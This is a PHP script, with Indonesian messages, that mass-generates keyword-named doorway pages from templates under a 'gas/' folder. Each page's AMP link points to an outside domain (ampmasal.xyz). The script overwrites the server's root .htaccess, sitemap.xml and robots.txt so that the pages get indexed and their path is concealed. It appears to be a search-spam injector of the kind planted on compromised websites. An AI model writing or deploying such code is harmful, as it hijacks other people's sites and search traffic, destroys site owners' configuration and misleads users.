<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

function getFileContent($filePath) {
    if (!file_exists($filePath)) {
        throw new Exception("File tidak ditemukan di: $filePath");
    }
    $content = file_get_contents($filePath);
    if ($content === false) {
        throw new Exception("Gagal membaca konten file: $filePath");
    }
    return $content;
}

function ensureTrailingSlash($url) {
    return rtrim($url, '/') . '/';
}

function formatArticle($article) {
    $article = trim($article);
    return '<p>' . $article . '</p>';
}

function processContent($content, $replacements) {
    // Ganti kurung kurawal ganda dengan kurung kurawal tunggal untuk proses awal
    $processedContent = str_replace(['{{', '}}'], ['{', '}'], $content);
    
    // Ganti placeholder
    $processedContent = str_replace(
        [
            '{BRAND_NAME}',
            '{URL_PATH}',
            '{AMP_URL}',
            '{BRANDS_NAME}',
            '{TITLE}',
            '{DESCRIPTION}',
            '{ARTICLE}',
            '{ARTICLE_CONTENT}'
        ],
        [
            $replacements['BRAND_NAME'],
            $replacements['URL_PATH'],
            $replacements['AMP_URL'],
            $replacements['BRANDS_NAME'],
            $replacements['TITLE'],
            $replacements['DESCRIPTION'],
            $replacements['ARTICLE'],
            $replacements['ARTICLE_CONTENT']
        ],
        $processedContent
    );
    
    return $processedContent;
}

$filename = $gas_txt;
$templateFile = $template_php;
$mainDir = "gas";
$successfulUrls = [];
$titlesFile = $title_txt;
$descriptionsFile = $descriptions_txt;
$artikelFile = $artikel_txt;

try {
    $titleContent = getFileContent($titlesFile);
    $titles = array_filter(array_map('trim', explode("\n", $titleContent)));
    
    if (empty($titles)) {
        throw new Exception("File title kosong atau tidak valid");
    }
    
    $descriptionContent = getFileContent($descriptionsFile);
    $descriptions = array_filter(array_map('trim', explode("\n", $descriptionContent)));
    
    if (empty($descriptions)) {
        throw new Exception("File description kosong atau tidak valid");
    }

    $articleContent = getFileContent($artikelFile);
    $articles = array_filter(array_map('trim', explode("\n", $articleContent)));
    
    if (empty($articles)) {
        throw new Exception("File artikel kosong atau tidak valid");
    }

    $templateContent = getFileContent($templateFile);
    $keywordsContent = getFileContent($filename);
    $lines = array_filter(array_map('trim', explode("\n", $keywordsContent)));

    if (!is_dir($mainDir)) {
        if (!mkdir($mainDir, 0755, true)) {
            throw new Exception("Gagal membuat direktori '$mainDir'");
        }
    }

    $currentDomain = $_SERVER['HTTP_HOST'];
    $titleIndex = $descriptionIndex = $articleIndex = 0;

    foreach ($lines as $line) {
        $folderName = str_replace(' ', '-', trim($line));
        $folderPath = "$mainDir/$folderName";
        
        $folderURL = ensureTrailingSlash("https://$currentDomain/$folderName");
        $ampURL = ensureTrailingSlash("https://ampmasal.xyz/$folderName");

        // Siapkan replacements
        $replacements = [
            'BRAND_NAME' => strtoupper($folderName),
            'URL_PATH' => $folderURL,
            'AMP_URL' => $ampURL,
            'BRANDS_NAME' => strtolower($folderName),
            'TITLE' => '',
            'DESCRIPTION' => '',
            'ARTICLE' => '',
            'ARTICLE_CONTENT' => ''
        ];

        // Proses konten dengan placeholder
        $currentTitle = isset($titles[$titleIndex]) ? processContent($titles[$titleIndex], $replacements) : processContent($titles[0], $replacements);
        $currentDescription = isset($descriptions[$descriptionIndex]) ? processContent($descriptions[$descriptionIndex], $replacements) : processContent($descriptions[0], $replacements);
        $currentArticle = isset($articles[$articleIndex]) ? formatArticle(processContent($articles[$articleIndex], $replacements)) : formatArticle(processContent($articles[0], $replacements));

        // Update replacements
        $replacements['TITLE'] = $currentTitle;
        $replacements['DESCRIPTION'] = $currentDescription;
        $replacements['ARTICLE'] = $currentArticle;
        $replacements['ARTICLE_CONTENT'] = $currentArticle;

        if (!is_dir($folderPath) && !mkdir($folderPath, 0755, true)) {
            continue;
        }

        // Proses template dengan replacements yang telah diupdate
        $customContent = processContent($templateContent, $replacements);

        $indexPath = "$folderPath/index.php";
        if (file_put_contents($indexPath, $customContent) !== false) {
            echo "🔗 <a href='$folderURL' target='_blank'>$folderURL</a><br>";
            $successfulUrls[] = $folderURL;
            chmod($indexPath, 0644);
        }

        $titleIndex = ($titleIndex + 1) % count($titles);
        $descriptionIndex = ($descriptionIndex + 1) % count($descriptions);
        $articleIndex = ($articleIndex + 1) % count($articles);
    }

    // Generate .htaccess
    $htaccess = "RewriteEngine On\n";
    $htaccess .= "RewriteBase /\n\n";
    $htaccess .= "# Enforce trailing slash\n";
    $htaccess .= "RewriteCond %{REQUEST_URI} /+[^\.]+$\n";
    $htaccess .= "RewriteRule ^(.+[^/])$ %{REQUEST_URI}/ [R=301,L]\n\n";
    $htaccess .= "# Redirect from /gas/ URLs\n";
    $htaccess .= "RewriteCond %{THE_REQUEST} \s/+gas/([^\s]+) [NC]\n";
    $htaccess .= "RewriteRule ^ /%1 [R=301,L,NE]\n\n";
    $htaccess .= "# Internal rewrite\n";
    $htaccess .= "RewriteCond %{REQUEST_FILENAME} !-f\n";
    $htaccess .= "RewriteCond %{REQUEST_FILENAME} !-d\n";
    $htaccess .= "RewriteCond %{REQUEST_URI} !^/gas/\n";
    $htaccess .= "RewriteRule ^([^/]+)/?$ gas/$1/ [L,PT]\n\n";
    $htaccess .= "# Prevent direct gas access\n";
    $htaccess .= "RewriteCond %{REQUEST_URI} ^/gas/\n";
    $htaccess .= "RewriteCond %{ENV:REDIRECT_STATUS} ^$\n";
    $htaccess .= "RewriteRule ^ - [F]\n\n";
    $htaccess .= "# Disable directory indexing\n";
    $htaccess .= "Options -Indexes\n\n";
    $htaccess .= "# Prevent caching\n";
    $htaccess .= "<IfModule mod_headers.c>\n";
    $htaccess .= "    Header set Cache-Control \"no-cache, no-store, must-revalidate\"\n";
    $htaccess .= "    Header set Pragma \"no-cache\"\n";
    $htaccess .= "    Header set Expires 0\n";
    $htaccess .= "</IfModule>";

    $rootPath = $_SERVER['DOCUMENT_ROOT'];
    if (@file_put_contents($rootPath . '/.htaccess', $htaccess) === false) {
        error_log("Gagal menulis .htaccess ke: " . $rootPath . '/.htaccess');
    } else {
        @chmod($rootPath . '/.htaccess', 0644);
    }

    // Generate sitemap.xml
    $sitemap = '<?xml version="1.0" encoding="UTF-8"?>' . "\n";
    $sitemap .= '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . "\n";
    
    foreach ($successfulUrls as $url) {
        $sitemap .= "<url>\n";
        $sitemap .= "\t<loc>" . $url . "</loc>\n";
        $sitemap .= "\t<lastmod>" . date('Y-m-d') . "</lastmod>\n";
        $sitemap .= "\t<changefreq>weekly</changefreq>\n";
        $sitemap .= "\t<priority>1.0</priority>\n";
        $sitemap .= "</url>\n";
    }
    
    $sitemap .= "</urlset>";

    if (@file_put_contents($rootPath . '/sitemap.xml', $sitemap) !== false) {
        @chmod($rootPath . '/sitemap.xml', 0644);
        echo "<br>✅ Sitemap.xml berhasil dibuat<br>";
    }

    // Generate robots.txt
    $robotsContent = "User-agent: *\nAllow: /\n";
    $robotsContent .= "Sitemap: https://" . $currentDomain . "/sitemap.xml";

    if (@file_put_contents($rootPath . '/robots.txt', $robotsContent) !== false) {
        @chmod($rootPath . '/robots.txt', 0644);
        echo "✅ Robots.txt berhasil dibuat<br>";
    }

    echo "<br>Proses selesai.";

} catch (Exception $e) {
    echo "<h2>Error:</h2>";
    echo $e->getMessage();
    error_log("Create Folders Error: " . $e->getMessage());
}
?>
